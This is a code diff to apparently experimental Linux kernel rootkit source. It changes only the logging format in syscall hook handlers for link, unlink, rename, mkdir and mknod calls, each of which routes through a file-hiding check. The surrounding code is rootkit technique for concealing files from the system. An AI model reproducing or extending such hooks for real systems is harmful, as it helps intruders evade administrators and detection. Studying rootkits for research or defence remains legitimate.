@@ -34,8 +34,8 @@ SYSCALL_HOOK_HANDLER2(link, orig_link, p_regs, const char __user *, s_oldname, c
 SYSCALL_HOOK_HANDLER5(linkat, orig_linkat, p_regs, int, i32_olddfd, const char __user *, s_oldname,
                       int, i32_newdfd, const char __user *, s_newname, int, i32_flags)
 {
-    pr_info("[ROOTKIT] linkat(%d, %p, %d, %p, %d)\n", i32_olddfd, s_oldname, i32_newdfd, s_newname,
-            i32_flags);
+    pr_info("[ROOTKIT] linkat(%d, %p, %d, %p, %s%#x)\n", i32_olddfd, s_oldname, i32_newdfd,
+            s_newname, SIGNED_ARG(i32_flags));
 
     return do_check_hidden(orig_linkat, p_regs, i32_olddfd, s_oldname, i32_flags);
 }
@@ -52,7 +52,7 @@ SYSCALL_HOOK_HANDLER1(unlink, orig_unlink, p_regs, const char __user *, s_pathna
 SYSCALL_HOOK_HANDLER3(unlinkat, orig_unlinkat, p_regs, int, i32_dfd, const char __user *,
                       s_pathname, int, i32_flag)
 {
-    pr_info("[ROOTKIT] unlinkat(%d, %p, %d)\n", i32_dfd, s_pathname, i32_flag);
+    pr_info("[ROOTKIT] unlinkat(%d, %p, %s%#x)\n", i32_dfd, s_pathname, SIGNED_ARG(i32_flag));
 
     if ((i32_flag & ~AT_REMOVEDIR) != 0) {
         return -EINVAL;
@@ -84,7 +84,7 @@ SYSCALL_HOOK_HANDLER5(renameat2, orig_renameat2, p_regs, int, i32_olddfd, const 
                       s_oldname, int, i32_newdfd, const char __user *, s_newname, unsigned int,
                       ui32_flags)
 {
-    pr_info("[ROOTKIT] renameat2(%d, %p, %d, %p, %u)\n", i32_olddfd, s_oldname, i32_newdfd,
+    pr_info("[ROOTKIT] renameat2(%d, %p, %d, %p, %#x)\n", i32_olddfd, s_oldname, i32_newdfd,
             s_newname, ui32_flags);
 
     if ((ui32_flags & ~(RENAME_NOREPLACE | RENAME_EXCHANGE | RENAME_WHITEOUT)) ||
@@ -100,7 +100,7 @@ SYSCALL_HOOK_HANDLER5(renameat2, orig_renameat2, p_regs, int, i32_olddfd, const 
 SYSCALL_HOOK_HANDLER2(mkdir, orig_mkdir, p_regs, const char __user *, s_pathname, umode_t,
                       ui16_mode)
 {
-    pr_info("[ROOTKIT] mkdir(%p, %u)\n", s_pathname, ui16_mode);
+    pr_info("[ROOTKIT] mkdir(%p, %#ho)\n", s_pathname, ui16_mode);
 
     return do_check_hidden(orig_mkdir, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
 }
@@ -109,7 +109,7 @@ SYSCALL_HOOK_HANDLER2(mkdir, orig_mkdir, p_regs, const char __user *, s_pathname
 SYSCALL_HOOK_HANDLER3(mkdirat, orig_mkdirat, p_regs, int, i32_dfd, const char __user *, s_pathname,
                       umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] mkdirat(%d, %p, %u)\n", i32_dfd, s_pathname, ui16_mode);
+    pr_info("[ROOTKIT] mkdirat(%d, %p, %#ho)\n", i32_dfd, s_pathname, ui16_mode);
 
     return do_check_hidden(orig_mkdirat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
 }
@@ -118,7 +118,7 @@ SYSCALL_HOOK_HANDLER3(mkdirat, orig_mkdirat, p_regs, int, i32_dfd, const char __
 SYSCALL_HOOK_HANDLER3(mknod, orig_mknod, p_regs, const char __user *, s_pathname, umode_t,
                       ui16_mode, unsigned int, ui32_dev)
 {
-    pr_info("[ROOTKIT] mknod(%p, %u, %u)\n", s_pathname, ui16_mode, ui32_dev);
+    pr_info("[ROOTKIT] mknod(%p, %#ho, %u)\n", s_pathname, ui16_mode, ui32_dev);
 
     return do_check_hidden(orig_mknod, p_regs, AT_FDCWD, s_pathname, AT_LOOKUP_PARENTS);
 }
@@ -127,7 +127,7 @@ SYSCALL_HOOK_HANDLER3(mknod, orig_mknod, p_regs, const char __user *, s_pathname
 SYSCALL_HOOK_HANDLER4(mknodat, orig_mknodat, p_regs, int, i32_dfd, const char __user *, s_pathname,
                       umode_t, ui16_mode, unsigned int, ui32_dev)
 {
-    pr_info("[ROOTKIT] mknodat(%d, %p, %u, %u)\n", i32_dfd, s_pathname, ui16_mode, ui32_dev);
+    pr_info("[ROOTKIT] mknodat(%d, %p, %#ho, %u)\n", i32_dfd, s_pathname, ui16_mode, ui32_dev);
 
     return do_check_hidden(orig_mknodat, p_regs, i32_dfd, s_pathname, AT_LOOKUP_PARENTS);
 }
